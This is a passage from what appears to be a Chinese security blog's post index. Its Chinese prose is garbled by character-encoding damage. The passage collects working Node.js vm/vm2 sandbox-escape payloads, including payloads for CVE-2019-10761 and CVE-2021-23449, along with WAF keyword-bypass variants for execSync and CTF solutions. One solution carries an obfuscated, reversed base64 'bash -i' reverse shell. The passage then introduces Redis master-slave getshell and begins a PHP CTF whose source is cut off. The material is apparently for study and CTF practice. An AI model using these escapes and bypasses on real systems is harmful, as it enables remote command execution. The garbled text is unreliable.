2ï¼šå…¶ä»–VMæ²™ç®±é€ƒé€¸ ç¤ºä¾‹1ï¼š const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res)å¯ä»¥çœ‹åˆ°è¿™é‡Œæ²™ç®±å¯¹è±¡å˜ä¸ºäº†nullï¼Œæ²¡æœ‰å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼Œæ‰€ä»¥thisçš„æ–¹æ³•æ— æ³•ä½¿ç”¨äº†ã€‚ è¿™æ—¶å€™æƒ³è¦é€ƒé€¸æˆ‘ä»¬è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§arguments.callee.callerï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚ åŸç†ï¼š ä¸Šé¢æ¼”ç¤ºçš„æ²™ç®±é€ƒé€¸å…¶å®å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„arguments.callee.callerå°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼ˆè¿”å›å‡½æ•°è°ƒç”¨è€…ï¼‰ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†ã€‚ payloadï¼š (() =\u003e { const a = {} a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString() } return a })()åˆ†æï¼š é¦–å…ˆæ˜¯åˆ›å»ºäº†ä¸ªç®­å¤´å‡½æ•°ï¼ˆä¸ºä»€ä¹ˆå¾…ä¼šå†è¯´ï¼‰ï¼Œå†åœ¨å‡½æ•°é‡Œé¢åˆ›å»ºäº†ä¸ªå¯¹è±¡aï¼Œç»™aå¯¹è±¡åˆ›å»ºäº†ä¸ªtoStringæ–¹æ³•ï¼ˆé‡å†™tostringæ–¹æ³•ï¼‰ã€‚é‡å†™çš„toStringæ–¹æ³•å¤§æ¦‚åŠŸèƒ½å°±æ˜¯ï¼Œç»™ccèµ‹å€¼ä¸ºarguments.callee.callerè·å–çš„å¯¹è±¡ï¼ˆç±»ä¼¼äºä¸Šé¢çš„thisï¼Œå°±æ˜¯è·å–ä¸ªå¤–éƒ¨å¯¹å¯¹è±¡ï¼‰ï¼Œå†æ‹¼æ¥åˆ°pä¸Šï¼Œé‚£ä¹ˆpçš„å€¼å°±å˜ä¸ºäº†processè¿™ä¸ªå‡½æ•°ï¼Œå†å°†pæ‹¼æ¥åˆ°åˆ°æœ€åï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚ï¼ˆæ„æ€æ˜¯å¯ä»¥ç›´æ¥å…¨éƒ¨æ‹¼æ¥åˆ°ä¸€èµ·ï¼‰ã€‚æœ€åç®­å¤´å‡½æ•°å°±æ˜¯ä¸ºäº†return aè¿™ä¸ªå¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯æ‰§è¡Œç»“æœï¼‰ã€‚ arguments.callee.callerä¹‹æ‰€ä»¥ä¼šè¿”å›ä¸ªå¯¹åƒï¼Œæ˜¯å› ä¸ºæ²™ç®±å¤–console.logä¸­é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼è°ƒç”¨äº†è¿™ä¸ªé‡å†™åçš„toStringå‡½æ•°ï¼Œè§¦å‘arguments.callee.callerå‡½æ•°åŠŸèƒ½ã€‚ ç¤ºä¾‹2ï¼š const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res.abc)æ²¡æœ‰äº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½†æ‰“å°ç»“æœä¸ºres.abcï¼Œå¯ä»¥ç”¨Proxyæ¥åŠ«æŒå±æ€§ï¼š payloadï¼š (() =\u003e{ const a = new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } }) return a })()åˆ†æï¼š ä¹Ÿæ˜¯ä¸ºäº†è°ƒç”¨å¤–éƒ¨å¯¹è±¡ã€‚è§¦å‘åˆ©ç”¨é“¾çš„é€»è¾‘å°±æ˜¯æˆ‘ä»¬åœ¨get:è¿™ä¸ªé’©å­é‡Œå†™äº†ä¸€ä¸ªæ¶æ„å‡½æ•°ï¼Œå½“æˆ‘ä»¬åœ¨æ²™ç®±å¤–è®¿é—®proxyå¯¹è±¡çš„ä»»æ„å±æ€§ï¼ˆä¸è®ºæ˜¯å¦å­˜åœ¨ï¼‰è¿™ä¸ªé’©å­å°±ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå®ç°äº†rceã€‚ ç¤ºä¾‹3ï¼š const vm = require('vm'); const script = `...`; try { vm.runInContext(script, vm.createContext(Object.create(null))); }catch(e) { console.log(e.message) }payloadï¼› throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } })ç»“åˆäº†ç¤ºä¾‹2ï¼Œå› ä¸ºthrowäº†ä¸ªé”™è¯¯ï¼Œç›´æ¥åˆ°äº†catchæ¨¡å—ï¼Œç„¶åconsole.log(e.message)è§¦å‘é’©å­get:ã€‚ï¼ˆåŸç†éƒ½å¤§å·®ä¸å·®äº†ï¼‰ ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:2","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"VM2æ²™ç®±é€ƒé€¸ å¼•ç”¨å¸ˆå‚…ä»¬çš„åŸºç¡€ cli.jså®ç°äº†å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨vm2 ä¹Ÿå°±æ˜¯binä¸‹çš„vm2ã€‚ contextify.jså°è£…äº†ä¸‰ä¸ªå¯¹è±¡ï¼šContextify Decontextify propertyDescriptorï¼Œå¹¶ä¸”é’ˆå¯¹globalçš„Bufferç±»è¿›è¡Œäº†ä»£ç†ã€‚ main.js æ˜¯vm2æ‰§è¡Œçš„å…¥å£ï¼Œå¯¼å‡ºäº†NodeVM VMè¿™ä¸¤ä¸ªæ²™ç®±ç¯å¢ƒï¼Œè¿˜æœ‰ä¸€ä¸ªVMScriptå®é™…ä¸Šæ˜¯å°è£…äº†vm.Scriptã€‚ sandbox.jsé’ˆå¯¹globalçš„ä¸€äº›å‡½æ•°å’Œå˜é‡è¿›è¡Œäº†æ‹¦æˆªï¼Œæ¯”å¦‚setTimeoutï¼ŒsetIntervalç­‰ vm2ç›¸æ¯”vmåšå‡ºå¾ˆå¤§çš„æ”¹è¿›ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯åˆ©ç”¨äº†es6æ–°å¢çš„proxyç‰¹æ€§ï¼Œä»è€Œä½¿ç”¨é’©å­æ‹¦æˆªå¯¹constructorå’Œ__proto__è¿™äº›å±æ€§çš„è®¿é—®ã€‚ VMè¿è¡Œæ¼”ç¤º const {VM, VMScript} = require('vm2'); const script = new VMScript(\"let a = 2;a;\"); console.log((new VM()).run(script));VMæ˜¯vm2åœ¨vmçš„åŸºç¡€ä¸Šå°è£…çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–åè°ƒç”¨å…¶ä¸­çš„runæ–¹æ³•å°±å¯ä»¥è¿è¡Œä¸€æ®µè„šæœ¬ã€‚ ï¼ˆCVE-2019-10761ï¼‰ è¯¥æ¼æ´è¦æ±‚vm2ç‰ˆæœ¬\u003c=3.6.10 const {VM} = require('vm2'); const untrusted = ``; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); }payload: const f = Buffer.prototype.write; const ft = { length: 10, utf8Write(){ } } function r(i){ var x = 0; try{ x = r(i); }catch(e){} if(typeof(x)!=='number') return x; if(x!==i) return x+1; try{ f.call(ft); }catch(e){ return e; } return null; } var i=1; while(1){ try{ i=r(i).constructor.constructor(\"return process\")(); break; }catch(x){ i++; } } i.mainModule.require(\"child_process\").execSync(\"whoami\").toString()ç»§ç»­å¼•ç”¨ï¼š è¿™æ¡é“¾å­è·å–æ²™ç®±å¤–å¯¹è±¡çš„æ–¹æ³•æ˜¯ åœ¨æ²™ç®±å†…ä¸æ–­é€’å½’ä¸€ä¸ªå‡½æ•°ï¼Œå½“é€’å½’æ¬¡æ•°è¶…è¿‡å½“å‰ç¯å¢ƒçš„æœ€å¤§å€¼æ—¶ï¼Œæˆ‘ä»¬æ­£å¥½è°ƒç”¨æ²™ç®±å¤–çš„å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´æ²™ç®±å¤–çš„è°ƒç”¨æ ˆè¢«çˆ†æ‰ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…catchè¿™ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œå°±æ‹¿åˆ°äº†ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ ä¸¾ä¸ªä¾‹å­ï¼š å‡è®¾å½“å‰ç¯å¢ƒä¸‹æœ€å¤§é€’å½’å€¼ä¸º1000ï¼Œæˆ‘ä»¬é€šè¿‡ç¨‹åºæ§åˆ¶é€’å½’999æ¬¡ï¼ˆæ³¨æ„è¿™é‡Œè¯´çš„é€’å½’å€¼ä¸æ˜¯ä¸€ç›´è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°çš„æœ€å¤§å€¼ï¼Œè€Œæ˜¯å•æ¬¡ç¨‹åºå†…è°ƒç”¨å‡½æ•°æ¬¡æ•°çš„æœ€å¤§å€¼ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨æ ˆçš„æœ€å¤§å€¼ï¼‰ï¼š r(i); // è¯¥å‡½æ•°é€’å½’999æ¬¡ f.call(ft); // é€’å½’åˆ°ç¬¬1000æ¬¡æ—¶è°ƒç”¨fè¿™ä¸ªå‡½æ•°ï¼Œfä¸ºBuffer.prototype.writeï¼Œå°±æ˜¯ä¸‹é¢å›¾ç‰‡çš„è¿™ä¸ªå‡½æ•° this.utf8Write() // é€’å½’åˆ°1001æ¬¡æ—¶ä¸ºè¯¥å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œæ‰€ä»¥çˆ†æ ˆæ—¶æ•æ‰çš„å¼‚å¸¸ä¹Ÿæ˜¯æ²™ç®±å¤–ï¼Œä»è€Œè¿”å›äº†ä¸€ä¸ªæ²™ç®± å¤–çš„å¼‚å¸¸å¯¹è±¡ ï¼ˆCVE-2021-23449ï¼‰ const {VM} = require(\"vm2\"); let vmInstance = new VM(); let code = vmInstance.run(code); console.log(polluted);payload1ï¼š res = eval(\u0026#39;import(\\\\\u0026#39;./foo.js\\\\\u0026#39;);\u0026#39;) res.__proto__.__proto__.polluted = res.__proto__.__proto__.toString.constructor(\u0026quot;return this\u0026quot;)().process.mainModule.require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;touch HACKED\u0026quot;).toString();payload2ï¼š import('./foo.js') res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();payload3ï¼š Symbol = { get toStringTag(){ throw f=\u003ef.constructor(\"return process\")() } }; try{ Buffer.from(new Map()); }catch(f){ Symbol = {}; f(()=\u003e{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString(); }è¿™ä¸ªå°±çœ‹å‚è€ƒå¥½äº†ï¼Œè§£é‡Šä¸å‡ºæ¥ã€‚ ï¼ˆ[HFCTF2020]JustEscapeï¼‰ \"use strict\"; const {VM} = require('vm2'); const untrusted = ''; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); }paylaod: (function(){ TypeError.prototype.get_process = f=\u003ef.constructor(\"return process\")(); try{ Object.preventExtensions(Buffer.from(\"\")).a = 1; }catch(e){ return e.get_process(()=\u003e{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString(); } })()è¿™é“é¢˜æœ‰å…³é”®å­—wafï¼Œç”¨æ¨¡æ¿å­—ç¬¦ä¸²æ‹¼æ¥å¯ä»¥ç»•è¿‡ æœ€ç»ˆpayload; (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=\u003ef[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_pro`}cess`}`](()=\u003e{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString(); } })()","date":"2024-03-26","objectID":"/posts/nodejs-vm/:3:0","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"å…³é”®å­—ç»•è¿‡ ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:4:0","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"ä¸€ã€ nodejså‘½ä»¤æ‰§è¡Œ 1ï¼š16è¿›åˆ¶ç¼–ç  require(\"child_process\")[\"exe\\x63Sync\"](\"whoami\")2ï¼šunicodeç¼–ç  require(\"child_process\")[\"exe\\u0063Sync\"](\"whomai\")3ï¼šåŠ å·æ‹¼æ¥ require('child_process')['exe'%2b'cSync']('whoami')4ï¼šæ¨¡æ¿å­—ç¬¦ä¸²æ‹¼æ¥ require('child_process')${`${`exe`}cSync`}('curl 127.0.0.1:1234') require('child_process')[`${`${`exe`}cSync`}`]('curl 127.0.0.1:1234') //åŠ ä¸åŠ ä¸­æ‹¬å·è¦å–å†³äºå¤–é¢ä¸€å±‚æ˜¯å¦æœ‰åå¼•å· 5ï¼šconcatè¿æ¥ require(\"child_process\")[\"exe\".concat(\"cSync\")](\"curl 127.0.0.1:1234\")6ï¼šbase64ç¼–ç  eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString()) ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:4:1","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"äºŒã€ ä¸Šé¢æåˆ°çš„å‡ ç§æ–¹æ³•ï¼Œæœ€ç»ˆæ€è·¯éƒ½æ˜¯é€šè¿‡ç¼–ç æˆ–è€…æ‹¼æ¥å¾—åˆ°å…³é”®å­—ï¼Œè¿™ä¸€å—è€ƒè™‘jsçš„ä¸€äº›è¯­æ³•å’Œå†…ç½®å‡½æ•°ã€‚ 1ï¼šObejct.keys console.log(require('child_process').constructor===Object) //true Object.values(require('child_process'))[5]('curl 127.0.0.1:1234')åˆ©ç”¨Object.valueså°±å¯ä»¥æ‹¿åˆ°child_processä¸­çš„å„ä¸ªå‡½æ•°æ–¹æ³•ï¼Œå†é€šè¿‡æ•°ç»„ä¸‹æ ‡å°±å¯ä»¥æ‹¿åˆ°execSync è¿èµ·æ¥ç”¨å°±æ˜¯ require('child_process').constructor.values(require('child_process'))[5]('calc') 2ï¼šReflect global[Reflect.ownKeys(global).find(x=\u003ex.includes('eval'))]('global.process.mainModule.constructor._load(\"child_process\").execSync(\"whoami\")')è¿”å›Reflect.ownKeys(global)æ‰€æœ‰å‡½æ•°ï¼Œç„¶ååœ¨æ‰€æœ‰å‡½æ•°ä¸­æ‰¾åˆ°evalï¼Œè¿™æ ·æ‹¿åˆ°evalå°±ä¸éœ€è¦å†å»å¼•å…¥processæ¨¡å—äº†ï¼Œevalé‡Œé¢å°±æœ‰ å¦‚æœè¿‡æ»¤äº†evalå…³é”®å­—ï¼Œå¯ä»¥ç”¨includes('eva')æ¥æœç´¢evalå‡½æ•°ï¼Œä¹Ÿå¯ä»¥ç”¨startswith('eva')æ¥æœç´¢ 3ï¼šReflect.get å¦‚æœä¸­æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œ Reflect.get(target, propertyKey[, receiver])çš„ä½œç”¨æ˜¯è·å–å¯¹è±¡èº«ä¸ŠæŸä¸ªå±æ€§çš„å€¼ï¼Œç±»ä¼¼äºtarget[name] Reflect.get(global, Reflect.ownKeys(global).find(x=\u003ex.includes('eva'))) ç­‰ä»·äº global[Reflect.ownKeys(global).find(x=\u003ex.includes('eva'))]","date":"2024-03-26","objectID":"/posts/nodejs-vm/:4:2","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"NKCTF2024 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:5:0","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"ä¸–ç•Œä¸Šæœ€ç®€å•çš„CTF ä¸»è¦æºç ï¼š const vm = require('vm'); const script= ` ` const sandbox = Object.create(null); const context = new vm.createContext(sandbox); try { waf(script); // è°ƒç”¨ waf å‡½æ•°å¯¹ä»£ç è¿›è¡Œç®€å•çš„å®‰å…¨æ£€æŸ¥ let result = vm.runInContext(script, context); // åœ¨æ²™ç›’ç¯å¢ƒä¸­æ‰§è¡Œä»£ç  console.log(result); // æ‰“å°æ‰§è¡Œç»“æœ } catch(e) { console.log(e.message); // æ•è·å¯èƒ½çš„å¼‚å¸¸å¹¶æ‰“å°é”™è¯¯æ¶ˆæ¯ //åœ¨å‡ºç°å¼‚å¸¸æ—¶å°è¯•å¼•å…¥åä¸º hack çš„æ¨¡å— } function waf(script) { let pattern = /(prcess|\\[.*?\\]|exc|spawn|Buffer|\\+|concat|eval|Function)/g; if (script.match(pattern)) { throw new Error(\"what can I say? hacker out!!\"); } }å¯ä»¥çœ‹åˆ°æœ‰catchæ¨¡å—ï¼Œå¯ä»¥ç”¨VMæ²™ç›’é€ƒé€¸çš„ç¤ºä¾‹3ã€‚ ä½†æœ‰waféœ€è¦ç»•è¿‡ï¼Œï¼ˆè¿™é‡Œå­—ç¬¦ä¸²æ‹¼æ¥æˆ–ç¼–ç çš„æ–¹å¼éƒ½ä¸è¡Œï¼Œä¹Ÿå°±æ˜¯å…³é”®å­—ç»•è¿‡çš„ä¸€æ¨¡å—ï¼Œå› ä¸ºä¼šåœ¨wafçš„ä¸Šä¸€æ­¥å°±ä¼šè‡ªåŠ¨è§£æå‡ºæ¥ï¼Œå¯ä»¥åœ¨wafæ—¶æ‰“å°å†…å®¹çœ‹çœ‹ï¼Œæ‰€ä»¥åªèƒ½ç”¨jsçš„è¯­æ³•æ¥ç»•è¿‡ï¼‰ paylaod1ï¼š throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return global'))(); const a = Reflect.get(p, Reflect.ownKeys(p).find(x=\u003ex.includes('pro'))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)); return Reflect.get(a, Reflect.ownKeys(a).find(x=\u003ex.includes('ex')))(\"calc\"); } })ç”¨çš„Reflectç»•è¿‡ï¼Œ åˆ†æ; è·å–å¤–éƒ¨å¯¹è±¡ï¼Œæ‹¿åˆ°globalï¼Œè¿”å›globalå…¨éƒ¨å‡½æ•°ï¼Œæ‰¾åˆ°processï¼Œç„¶åè·å¾—child_processï¼Œå› ä¸ºæ˜¯å­—ç¬¦ä¸²æ‰€ä»¥å¯ä»¥è¿™æ ·ç»•è¿‡ï¼ˆä¸Šé¢ä¸æ˜¯è¯´äº†ä¸èƒ½ç¼–ç ç»•è¿‡å—ï¼Ÿå…¶å®åªè¦æ¶‰åŠåˆ°å‡½æ•°ï¼Œå°±åªæœ‰æ‰§è¡Œå‘½ä»¤æ—¶æ‰èƒ½è§£æå‡ºæ¥ã€‚wafæ—¶è§£ææ˜¯è‡ªåŠ¨è§£æåƒæ— å‡½æ•°çš„ç¼–ç ï¼Œä»¥åŠå­—ç¬¦ä¸²æ‹¼æ¥ã€‚é‚£ä¸ºä»€ä¹ˆä¸å…¨è¿™æ ·ç»•è¿‡ï¼Ÿè¿™æ ·åªèƒ½ç»•è¿‡å­—ç¬¦ä¸²ï¼Œæ–¹æ³•ä¸èƒ½ç”¨è¿™ç§æ–¹å¼ç»•è¿‡ï¼‰ã€‚ payload2ï¼š throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const aa = 'return Process'.toLowerCase(); const bb = 'child_pRocess'.toLowerCase(); const p = (cc.constructor.constructor(aa))().mainModule.require(bb); return Reflect.get(Reflect.get(p, Reflect.ownKeys(p).find(x=\u003ex.startsWith('ex')))('calc')); } })åˆ†æï¼š ç”¨çš„toLowerCase()å‡½æ•°ï¼ˆè½¬å°å†™ï¼‰ç»•è¿‡äº†å…³é”®å­—å­—ç¬¦ä¸²ï¼Œç„¶åç”¨Reflectç»•è¿‡æ–¹æ³•ã€‚æœ€åä¸€å¥æ˜¯ä¸ªä»€ä¹ˆæ„æ€ï¼Ÿ ç­‰äºï¼š [p[Reflect.ownKeys(p).find(x=\u003ex.startsWith('ex'))]('calc')]å¯è§æœ€å¤–é¢ä¸€å±‚ä¸­æ‹¬å·ä¸è¦ä¹Ÿè¡Œï¼ˆåé¢è¯•äº†ä¹Ÿç¡®å®å¯ä»¥ï¼‰ï¼š payload3ï¼š throw new Proxy({}, { get: function(){ const content = `;)\"'}i-,hsab{|}d-,46esab{|}d-,46esab{|}9UkaKtSQElkMZpmTygzQORTRqxUeFpWT11EVOVXWE1Ee4M0YqJ1MMJjVHpldBlmSrE0UhRXQDFmeG1WW,ohce{' c- hsab\"(cexe;)\"ssecorp_dlihc\"(eriuqer = } cexe { tsnoc`; const reversedContent = content.split('').reverse().join(''); const c = arguments.callee.caller; const p = (c.constructor.constructor(`${`${`return proces`}s`}`))(); p.mainModule.require('fs').writeFileSync('/tmp/test1.js', reversedContent); return p.mainModule.require(`${`${`child_proces`}s`}`).fork('/tmp/test1.js').toString(); } })é€†åºå†…å®¹ï¼š `const { exec } = require(\"child_process\");exec(\"bash -c '{echo,WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1EWXVOVE11TWpFeUxqRTROQzgyTmpZMklEQStKakU9}|{base64,-d}|{base64,-d}|{bash,-i}'\");`é€†åº+base64ï¼ˆä½†å¾ˆç¥å¥‡ï¼Œè¿™ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²æ‹¼æ¥ç«Ÿç„¶ä¹Ÿè¡Œï¼‰ éšä¾¿é€‰ä¸€ç§éƒ½å¯ä»¥æˆåŠŸåå¼¹shellï¼š ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:5:1","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"redisä¸»ä»å¤åˆ¶ 1redisæ˜¯ä»€ä¹ˆå‚è€ƒï¼šhttps://www.cnblogs.com/testfan2019/p/11008297.html ä¸€æ¬¾å†…å­˜é«˜é€Ÿç¼“å­˜æ•°æ®åº“ï¼Œ æœ€å¤§çš„ç‰¹ç‚¹:å¿« 2gopheråè®®æ˜¯ä»€ä¹ˆ Gopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œå®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œå¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®® Gopheråè®®æ ¼å¼ï¼šURL:gopher://:/_åæ¥TCPæ•°æ®æµ å…¶å®æ„Ÿè§‰gopheråè®®å°±æ˜¯å¯ä»¥å‘é€æ•°æ®æµï¼Œåœ¨ssrfä¸­è¿™ä¸ªåè®®ç±»ä¼¼å¯ä»¥ä¼ é€’æ•°æ®å‘½ä»¤ã€‚ 3redisä¸»ä»å¤åˆ¶æ˜¯ä»€ä¹ˆ Redisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ 4ä¸ºä»€ä¹ˆè¦ç”¨redisä¸»ä»å¤åˆ¶æ¥getshell éšç€ç°ä»£çš„æœåŠ¡éƒ¨ç½²æ–¹å¼çš„ä¸æ–­å‘å±•ï¼Œç»„ä»¶åŒ–æˆäº†ä¸å¯é€ƒé¿çš„å¤§è¶‹åŠ¿ï¼Œdockerå°±æ˜¯è¿™è‚¡é£æ½®ä¸‹çš„äº§ç‰©ä¹‹ä¸€ï¼Œè€Œåœ¨è¿™ç§éƒ¨ç½²æ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªå•ä¸€çš„å®¹å™¨ä¸­ä¸ä¼šæœ‰é™¤redisä»¥å¤–çš„ä»»ä½•æœåŠ¡å­˜åœ¨ï¼ŒåŒ…æ‹¬sshå’Œcrontabï¼Œå†åŠ ä¸Šæƒé™çš„ä¸¥æ ¼æ§åˆ¶ï¼Œåªé å†™æ–‡ä»¶å°±å¾ˆéš¾å†getshelläº†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±éœ€è¦å…¶ä»–çš„åˆ©ç”¨æ‰‹æ®µäº† æ‰€ä»¥å¯è§å¹¶ä¸æ˜¯æƒ³ç”¨ï¼Œæ˜¯redisçš„å¦å¤–ä¸‰ç§æ–¹æ³•éƒ½ä¸è¡Œäº†æ‰ç”¨çš„ã€‚ slaveofåé¢è·Ÿçš„æ˜¯ä¸»æœåŠ¡å™¨ip ","date":"2024-03-09","objectID":"/posts/rdis/:0:0","tags":["redis"],"title":"redisæ•°æ®åº“ä¸»ä»å¤åˆ¶","uri":"/posts/rdis/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ› ezezez_php \u003c?php highlight_file(__FILE__); include \"function.php\"; class Rd { public $ending; public $cl; public $poc; public function __destruct() { echo \"All matters have concluded\".\"\u003c/br\u003e\"; } public function __call($name, $arg) { foreach ($arg as $key =\u003e $value) { if ($arg[0]['POC'] == \"0.o\") { $this-\u003ecl-\u003evar1 = \"get\"; } } } } class Poc { public $payload; public $fun; public function __set($name, $value) { $this-\u003epayload = $name; $this-\u003efun = $value; } function getflag($paylaod) { echo \"Have you genuinely accomplished what you set out to do?\".\"\u003c/br\u003e\"; file_get_contents($paylaod); } } class Er { public $symbol; public $Flag; public function 